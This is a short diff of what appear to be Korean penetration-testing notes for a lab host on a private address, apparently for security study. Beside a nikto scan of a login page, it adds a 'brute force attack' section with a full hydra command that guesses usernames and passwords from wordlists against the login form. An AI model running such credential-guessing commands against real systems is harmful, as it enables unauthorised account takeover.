@@ -13,3 +13,5 @@
 - 일반 사용자 로그인 페이지: `http://192.168.56.112:8080/`
 `nikto -h http://192.168.56.112:8080/`
 
+# \[브루트 포스 공격]
+`hydra http://192.168.56.112:8080/ http-form-post "username=^USER^&pwd=^PASS^:Invalid username." -L weakuser.txt -P weakpass.txt`
